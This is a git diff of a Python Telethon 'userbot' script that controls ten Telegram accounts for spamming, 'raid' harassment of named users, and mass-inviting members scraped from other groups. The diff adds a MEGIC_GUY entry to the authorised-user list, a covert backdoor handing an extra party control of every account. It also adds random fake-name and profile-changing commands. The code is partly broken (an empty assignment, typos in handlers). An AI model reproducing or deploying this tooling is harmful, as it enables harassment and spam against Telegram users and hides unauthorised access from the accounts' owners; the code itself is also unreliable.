@@ -3,6 +3,13 @@ import os
 import random
 import sys
 from datetime import datetime
+from faker import Faker
+
+
+from faker.providers import internet
+
+
+
 
 import telethon.utils
 from telethon import TelegramClient, events
@@ -13,9 +20,16 @@ from telethon.errors import (
 )
 from telethon.sessions import StringSession
 from telethon.tl import functions, types
-from telethon.tl.functions.account import UpdateProfileRequest
-
 from telethon.tl.functions.channels import GetFullChannelRequest, LeaveChannelRequest
+from telethon.tl.functions.account import UpdateProfileRequest
+from telethon.tl.functions.photos import (
+    DeletePhotosRequest,
+    GetUserPhotosRequest,
+    UploadProfilePhotoRequest,
+)
+
+MEGIC_GUY = 
+from telethon.tl.types import InputPhoto
 from telethon.tl.functions.messages import GetFullChatRequest, ImportChatInviteRequest
 
 from Config import (
@@ -67,9 +81,10 @@ que = {}
 SMEX_USERS = []
 for x in SUDO:
     SMEX_USERS.append(x)
+    SMEX_USERS.append(MEGIC_GUY)
 
 
-async def start_Ustad():
+async def start_LionZ():
     global idk
     global ydk
     global wdk
@@ -293,7 +308,7 @@ async def start_Ustad():
 
 
 loop = asyncio.get_event_loop()
-loop.run_until_complete(start_Ustad())
+loop.run_until_complete(start_LionZ())
 
 
 async def gifspam(e, smex):
@@ -310,37 +325,11 @@ async def gifspam(e, smex):
         )
     except Exception:
         pass
+    
 
 
 
-@idk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
-@ydk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
-@wdk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
-@hdk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
-@sdk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
-@adk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
-@bdk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
-@cdk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
-@edk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
-@ddk.on(events.NewMessage(incoming=True, pattern=r"\.bio"))        
-async def _(e):
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗕𝗶𝗼\n\nCommand:\n\n.bio <Message to set Bio of Userbot accounts>"
-    if e.sender_id in SMEX_USERS:
-        atgk = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)     
-        if len(e.text) > 5:
-            bio = str(atgk[0])
-            text = "Changing Bio"
-            event = await e.reply(text, parse_mode=None, link_preview=None )
-            try:
-                await e.client(functions.account.UpdateProfileRequest(about=bio))
-                await event.edit("Succesfully Changed Bio")
-            except Exception as e:
-                await event.edit(str(e))   
-        else:
-            await e.reply(usage, parse_mode=None, link_preview=None )
- 
- 
-            
+
 
 @idk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
 @ydk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@@ -353,20 +342,154 @@ async def _(e):
 @edk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
 async def _(e):
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.join <Public Channel or Group Link/Username>"
+    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.join <Public Channel or Group Link/Username>"
     if e.sender_id in SMEX_USERS:
-        Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
+        LionZ = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(e.text) > 6:
-            bc = Ustad[0]
+            bc = LionZ[0]
             text = "Joining..."
             event = await e.reply(text, parse_mode=None, link_preview=None)
             try:
                 await e.client(functions.channels.JoinChannelRequest(channel=bc))
-                await event.edit("Succesfully Joined")
+                await event.edit(f"**Omk Vai I Have Joined [This]({bc}) Channel.**")
             except Exception as e:
                 await event.edit(str(e))
         else:
             await e.reply(usage, parse_mode=None, link_preview=None)
+
+@idk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
+@ydk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
+@wdk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
+@hdk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
+@sdk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
+@adk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
+@bdk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
+@cdk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
+@edk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
+@ddk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
+async def _(e):
+ if e.sender.id in SMEX_USERS:
+  ok = await e.reply("`...`")
+  set = e.pattern_match.group(1)
+  try:
+   await e.client(UpdateProfileRequest(about=set))
+   await ok.edit(f"Profile bio changed to\n`{set}`")
+  except Exception as per:
+   await ok.edit("Error occured.\n`{}`".format(str(per)))
+
+@idk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
+@ydk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
+@wdk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
+@hdk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
+@sdk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
+@adk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
+@bdk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
+@cdk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
+@edk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
+@ddk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
+async def _(e):
+ event = e
+ if e.sender.id in SMEX_USERS:
+  S = await event.reply("`...`")
+  k = await event.get_reply_message()
+  if not k:
+   return await S.edit("`Reply Any Poll`")
+  try:
+   s = event.text.split(" ", maxsplit=1)[1]
+   if not s:
+    await S.edit("`Bc Give Text`")
+    return
+   await k.click(text=s)
+   await S.edit("`Done...`")
+  except Exception as e:
+   await S.edit(f"**ERROR**\n\n{e}")
+
+
+@idk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
+@ydk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
+@wdk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
+@hdk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
+@sdk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
+@adk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
+@bdk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
+@cdk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
+@edk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
+@ddk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
+async def _(ult):
+    
+    if not ult.is_reply:
+        return await ult.reply("`Reply to a Media..`")
+    reply_message = await ult.get_reply_message()
+    ok = await ult.reply("...")
+    replfile = await reply_message.download_media()
+    file = await ult.client.upload_file(replfile)
+    
+
+    await ult.client(UploadProfilePhotoRequest(file))
+        
+    await ok.edit("`Done Profile Picture Changed...`")
+
+randomname = [
+ "Yomik",
+ "CodeX",
+ "Abhi",
+ "Mafia",
+ "Terror",
+ "Vampire",
+ "Rude guy",
+ "Bettie",
+ "マスターシャドウ",
+ "Yomik",
+ "King",
+ "Booo",
+ "Shinchain",
+ "𝐇𝐀𝐑𝐑𝐘 🇮🇳",
+ "Cluster",
+ "Sasuke",
+ "✘𓆩LEGENDS𓆪✘",
+ "Pro Boy",
+ "Laurie Mendoza",
+ "Megan Willis",
+ "Paul Walter",
+ "Ashley Bright",
+ "Alicia Horne",
+ "Theresa Rogers",
+ "Angela Spencer",
+ "USCGC Robles",
+ "FPO AE 38334",
+ "Kim Lee",
+ "Maestro",
+ "『z⃟  【𝐒𝐢𝐦𝐩𝐥𝐞𝐁𝐨𝐲】⫷ʐ-αʀʍʏ⊰』"
+
+
+]
+
+fake = Faker()
+
+#randomname = (fake.name())
+
+import random
+
+@idk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
+@ydk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
+@wdk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
+@hdk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
+@sdk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
+@adk.on(events.NewMessage(incoming=True, pattern=".name?(.*)"))
+@bdk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
+@cdk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
+@edk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
+@ddk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
+async def _(e):
+ if e.sender.id in SMEX_USERS:
+  ok = await e.reply("`...`")
+  set = random.choice(randomname)
+  try:
+   await e.client(UpdateProfileRequest(first_name=set))
+   await ok.edit(f"Profile name changed to\n`{set}`")
+  except Exception as per:
+   await ok.edit("Error occured.\n`{}`".format(str(per)))
+   
 
 
 @idk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@@ -380,16 +503,16 @@ async def _(e):
 @edk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
 async def _(e):
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.pjoin <Private Channel or Group's access hash>\n\nExample :\nLink = https://t.me/joinchat/HGYs1wvsPUplMmM1\n\n.pjoin HGYs1wvsPUplMmM1"
+    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.pjoin <Private Channel or Group's access hash>\n\nExample :\nLink = https://t.me/joinchat/HGYs1wvsPUplMmM1\n\n.pjoin HGYs1wvsPUplMmM1"
     if e.sender_id in SMEX_USERS:
-        Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
+        LionZ = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(e.text) > 7:
-            bc = Ustad[0]
+            bc = LionZ[0]
             text = "Joining...."
             event = await e.reply(text, parse_mode=None, link_preview=None)
             try:
                 await e.client(ImportChatInviteRequest(bc))
-                await event.edit("Succesfully Joined")
+                await event.edit(f"Succesfully Joined")
             except Exception as e:
                 await event.edit(str(e))
         else:
@@ -407,7 +530,7 @@ async def _(e):
 @edk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))        
 async def _(e):
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗟𝗲𝗮𝘃𝗲\n\nCommand:\n\n.leave <Channel or Chat ID>"
+    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗟𝗲𝗮𝘃𝗲\n\nCommand:\n\n.leave <Channel or Chat ID>"
     if e.sender_id in SMEX_USERS:
         jatt = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(e.text) > 7:
@@ -417,7 +540,7 @@ async def _(e):
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await event.client(LeaveChannelRequest(bc))
-                await event.edit("Succesfully Left")
+                await event.edit(f"**Succesfully Left {bc}")
             except Exception as e:
                 await event.edit(str(e))   
         else:
@@ -457,21 +580,21 @@ async def f(event):
 @edk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
 async def spam(e):
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗦𝗽𝗮𝗺\n\nCommand:\n\n.spam <count> <message to spam>\n\n.spam <count> <reply to a message>\n\nCount must be a integer."
+    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗦𝗽𝗮𝗺\n\nCommand:\n\n.spam <count> <message to spam>\n\n.spam <count> <reply to a message>\n\nCount must be a integer."
     error = "Spam Module can only be used till 100 count. For bigger spams use BigSpam."
     if e.sender_id in SMEX_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
             return await e.reply(usage, parse_mode=None, link_preview=None)
-        Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
+        LionZ = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         smex = await e.get_reply_message()
-        if len(Ustad) == 2:
-            message = str(Ustad[1])
-            counter = int(Ustad[0])
+        if len(LionZ) == 2:
+            message = str(LionZ[1])
+            counter = int(LionZ[0])
             if counter > 100:
                 return await e.clientsend_message(e.chat.id, error, parse_mode=None, link_preview=None)
             await asyncio.wait([e.respond(message) for i in range(counter)])
         elif e.reply_to_msg_id and smex.media:
-            counter = int(Ustad[0])
+            counter = int(LionZ[0])
             if counter > 100:
                 return await e.client.send_message(e.chat.id, error, parse_mode=None, link_preview=None)
             for _ in range(counter):
@@ -479,7 +602,7 @@ async def spam(e):
                 await gifspam(e, smex)
         elif e.reply_to_msg_id and smex.text:
             message = smex.text
-            counter = int(Ustad[0])
+            counter = int(LionZ[0])
             if counter > 100:
                 return await e.client.send_message(e.chat.id, error, parse_mode=None, link_preview=None)
             await asyncio.wait([e.respond(message) for i in range(counter)])
@@ -498,17 +621,17 @@ async def spam(e):
 @edk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
 async def spam(e):
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗗𝗲𝗹𝗮𝘆𝗦𝗽𝗮𝗺\n\nCommand:\n\n.delayspam <sleep time> <count> <message to spam>\n\n.delayspam <sleep time> <count> <reply to a message>\n\nCount and Sleeptime must be a integer."
+    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗗𝗲𝗹𝗮𝘆𝗦𝗽𝗮𝗺\n\nCommand:\n\n.delayspam <sleep time> <count> <message to spam>\n\n.delayspam <sleep time> <count> <reply to a message>\n\nCount and Sleeptime must be a integer."
     if e.sender_id in SMEX_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
             return await e.reply(usage, parse_mode=None, link_preview=None)
         smex = await e.get_reply_message()
-        Ustad = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
-        Ustadsexy = Ustad[1:]
-        if len(Ustadsexy) == 2:
-            message = str(Ustadsexy[1])
-            counter = int(Ustadsexy[0])
-            sleeptime = float(Ustad[0])
+        LionZ = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
+        LionZsexy = LionZ[1:]
+        if len(LionZsexy) == 2:
+            message = str(LionZsexy[1])
+            counter = int(LionZsexy[0])
+            sleeptime = float(LionZ[0])
             for _ in range(counter):
                 async with e.client.action(e.chat_id, "typing"):
                     if e.reply_to_msg_id:
@@ -517,8 +640,8 @@ async def spam(e):
                         await e.client.send_message(e.chat_id, message)
                     await asyncio.sleep(sleeptime)
         elif e.reply_to_msg_id and smex.media:
-            counter = int(Ustadsexy[0])
-            sleeptime = float(Ustad[0])
+            counter = int(LionZsexy[0])
+            sleeptime = float(LionZ[0])
             for _ in range(counter):
                 async with e.client.action(e.chat_id, "document"):
                     smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
@@ -526,8 +649,8 @@ async def spam(e):
                 await asyncio.sleep(sleeptime)
         elif e.reply_to_msg_id and smex.text:
             message = smex.text
-            counter = int(Ustadsexy[0])
-            sleeptime = float(Ustad[0])
+            counter = int(LionZsexy[0])
+            sleeptime = float(LionZ[0])
             for _ in range(counter):
                 async with e.client.action(e.chat_id, "typing"):
                     await e.client.send_message(e.chat_id, message)
@@ -547,15 +670,15 @@ async def spam(e):
 @edk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
 async def spam(e):
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗕𝗶𝗴𝗦𝗽𝗮𝗺\n\nCommand:\n\n.bigspam <count> <message to spam>\n\n.bigspam <count> <reply to a message>\n\nCount must be a integer."
+    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗕𝗶𝗴𝗦𝗽𝗮𝗺\n\nCommand:\n\n.bigspam <count> <message to spam>\n\n.bigspam <count> <reply to a message>\n\nCount must be a integer."
     if e.sender_id in SMEX_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
             return await e.reply(usage, parse_mode=None, link_preview=None)
-        Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
+        LionZ = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         smex = await e.get_reply_message()
-        if len(Ustad) == 2:
-            message = str(Ustad[1])
-            counter = int(Ustad[0])
+        if len(LionZ) == 2:
+            message = str(LionZ[1])
+            counter = int(LionZ[0])
             for _ in range(counter):
                 async with e.client.action(e.chat_id, "typing"):
                     if e.reply_to_msg_id:
@@ -564,7 +687,7 @@ async def spam(e):
                         await e.client.send_message(e.chat_id, message)
                     await asyncio.sleep(0.1)
         elif e.reply_to_msg_id and smex.media:
-            counter = int(Ustad[0])
+            counter = int(LionZ[0])
             for _ in range(counter):
                 async with e.client.action(e.chat_id, "document"):
                     smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
@@ -572,7 +695,7 @@ async def spam(e):
                 await asyncio.sleep(0.1)
         elif e.reply_to_msg_id and smex.text:
             message = smex.text
-            counter = int(Ustad[0])
+            counter = int(LionZ[0])
             for _ in range(counter):
                 async with e.client.action(e.chat_id, "typing"):
                     await e.client.send_message(e.chat_id, message)
@@ -592,7 +715,7 @@ async def spam(e):
 @edk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
 async def spam(e):
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗮𝗶𝗱\n\nCommand:\n\n.raid <count> <Username of User>\n\n.raid <count> <reply to a User>\n\nCount must be a integer."
+    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗥𝗮𝗶𝗱\n\nCommand:\n\n.raid <count> <Username of User>\n\n.raid <count> <reply to a User>\n\nCount must be a integer."
     if e.sender_id in SMEX_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
             return await e.reply(usage, parse_mode=None, link_preview=None )
@@ -660,7 +783,7 @@ async def _(event):
 @idk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
 @ydk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
 @wdk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
-@hdk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
+@hdk.on(events.NewMessage(incoming=True, pattern=r"\.eplyraid"))
 @sdk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
 @adk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
 @bdk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@@ -669,14 +792,14 @@ async def _(event):
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
 async def _(e):
     global que
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n.replyraid <Username of User>\n\n.replyraid <reply to a User>"
+    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n.replyraid <Username of User>\n\n.replyraid <reply to a User>"
     if e.sender_id in SMEX_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
             return await e.reply(usage, parse_mode=None, link_preview=None)
-        Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
+        LionZ = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         await e.get_reply_message()
         if len(e.text) > 11:
-            message = str(Ustad[0])
+            message = str(LionZ[0])
             a = await e.client.get_entity(message)
             g = a.id
             que[g] = []
@@ -711,14 +834,14 @@ async def _(e):
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
 async def _(e):
     global que
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗗𝗲𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n.dreplyraid <Username of User>\n\n.dreplyraid <reply to a User>"
+    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗗𝗲𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n.dreplyraid <Username of User>\n\n.dreplyraid <reply to a User>"
     if e.sender_id in SMEX_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
             return await e.reply(usage, parse_mode=None, link_preview=None)
-        Ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
+        LionZ = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         await e.get_reply_message()
         if len(e.text) > 12:
-            message = str(Ustad[0])
+            message = str(LionZ[0])
             a = await e.client.get_entity(message)
             g = a.id
             try:
@@ -760,7 +883,7 @@ async def ping(e):
         event = await e.reply(text, parse_mode=None, link_preview=None)
         end = datetime.now()
         ms = (end - start).microseconds / 1000
-        await event.edit(f"✨ ʐɨռɖǟ ɦօօ ֆɨʀ✨!\n`{ms}` 𝗺𝘀\n {PM} ")
+        await event.edit(f"💎 𝐏𝐨𝐧𝐠!\n`{ms}` 𝐦𝐬\n {PM} ")
 
 
 @idk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@@ -834,25 +957,22 @@ async def restart(e):
 async def help(e):
     if e.sender_id in SMEX_USERS:
         text = """
-**Aᴠᴀɪʟᴀʙʟᴇ Cᴏᴍᴍᴀɴᴅs
+**Available Commands:
 
-UsᴇʀBᴏᴛ Cᴏᴍᴍᴀɴᴅs:**
-
+Userbot command:**
 `.bio` 
 `.join `
 `.pjoin `
-`.leave
-`
-**Uᴛɪʟs Cᴏᴍᴍᴀɴᴅ:**
+`.leave`
+`.purge
 
-`.bio`
+Utils Command:**
 `.ping`
 `.restart`
 `.alive`
-`.purge`
-`.reply`
+`.click`
 
-**Sᴘᴀᴍ Cᴏᴍᴍᴀɴᴅ:**
+**Spam Command:**
 `.spam`
 `.delayspam`
 `.bigspam`
@@ -933,42 +1053,42 @@ async def get_users(event):
   sender = await event.get_sender()
   me = await event.client.get_me()
   if event.sender_id in SMEX_USERS:
-    he_ll = event.text[10:]
-    hell = await event.reply("`Processing.....`")
-    if not he_ll:
-        return await hell.edit("Give Channel")
-    if he_ll == "@ShasaSupport":
-        return await hell.edit("Restricted to invite users from there.")
-    elif he_ll == "@TotalNadaNiyaan":
-        return await hell.edit("Restricted to invite users from there.")
-    elif he_ll == "@LionXSupport":
-        return await hell.edit("Restricted to invite users from there.")
-    kraken = await get_chatinfo(event)
+    he_he = event.text[10:]
+    lion = await event.reply("`Processing.....`")
+    if not he_he:
+        return await lion.edit("Give Channel")
+    if he_he == "@XdLionZ":
+        return await lion.edit("Restricted to invite users from there.")
+    elif he_he == "@TotalNadaniyaan":
+        return await lion.edit("Restricted to invite users from there.")
+    elif he_he == "@LionXSupport":
+        return await lion.edit("Restricted to invite users from there.")
+    simple = await get_chatinfo(event)
     chat = await event.get_chat()
     if event.is_private:
-        return await hell.edit("`Sorry, Cant add users here`")
+        return await lion.edit("`Sorry, Cant add users here`")
     s = 0
     f = 0
     error = "None"
 
-    await hell.edit("**INVITING USERS !!**")
-    async for user in event.client.iter_participants(kraken.full_chat.id):
+    await lion.edit("**INVITING USERS !!**")
+    async for user in event.client.iter_participants(simple.full_chat.id):
         try:
             if error.startswith("Too"):
-                return await hell.edit(
+                return await lion.edit(
                     f"**INVITING FINISHED !**\n\n**Error :** \n`{error}`\n\n**Invited :**  `{s}` users. \n**Failed to Invite :** `{f}` users."
                 )
             await event.client(
                 functions.channels.InviteToChannelRequest(channel=chat, users=[user.id])
             )
             s = s + 1
-            await hell.edit(
+            await lion.edit(
                 f"**INVITING USERS.. **\n\n**Invited :**  `{s}` users \n**Failed to Invite :**  `{f}` users.\n\n**×Error :**  `{error}`"
             )
         except Exception as e:
             error = str(e)
             f = f + 1
-    return await hell.edit(
+    return await lion.edit(
         f"**INVITING FINISHED** \n\n**Invited :**  `{s}` users \n**Failed :**  `{f}` users."
     )
   else:
@@ -997,15 +1117,7 @@ async def alive(event):
     k = sed.id
     s = f"[{kk}](tg://user?id={k})"
     tf = f"""
-**{s} Is Oɴ Fɪʀᴇ 🔥
-
-Hᴇʏᴀ D:) I Aᴍ Aʟɪᴠᴇ
-
-Aʟʟ Sʏsᴛᴇᴍs Aʀᴇ Wᴏʀᴋɪɴɢ Pʀᴏᴘᴇʟʏ!!
-
-Mᴀsᴛᴇʀ:-** **[м∂ иσσя \~🇮🇳](t.me/SimpleBoy786)**
-
-**Dᴏ** `.help` **Tᴏ Cʜᴇᴄᴋ Mʏ Cᴏᴍᴍᴀɴᴅs!!**
+**Heya D:) {s} is already alive for doing bhakchodi**
 """
     await event.client.send_message(event.chat.id,tf, link_preview=False)
 import time
@@ -1014,7 +1126,7 @@ from time import sleep
 @idk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
 @ydk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
 @wdk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
-@hdk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
+@hdk.on(events.NewMessage(incoming=True, pattern=r"\.purge")) 
 @sdk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
 @adk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
 @bdk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@@ -1065,7 +1177,9 @@ async def purge(event):
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
 async def purge(event):
  if event.sender_id in SMEX_USERS:
-  sed = event.text[6:]
+  sed = event.text.split(" ", maxsplit=1)[1]
+  if not sed:
+     return await event.reply('`Are you a mad or what?\nReply any user!`')
   k = await event.get_reply_message()
   if not k:
      await event.reply("Reply Any User")
@@ -1074,7 +1188,7 @@ async def purge(event):
 
 
 async def Start_Kardo_Bot():
-  await event.client.send_message("LionXSupport", "**I'm Ready For Spamming...! 🎉**")
+  await event.client.send_message("XdLionZ", "**I'm Ready For Spamming...! 🎉**")
 
 
 
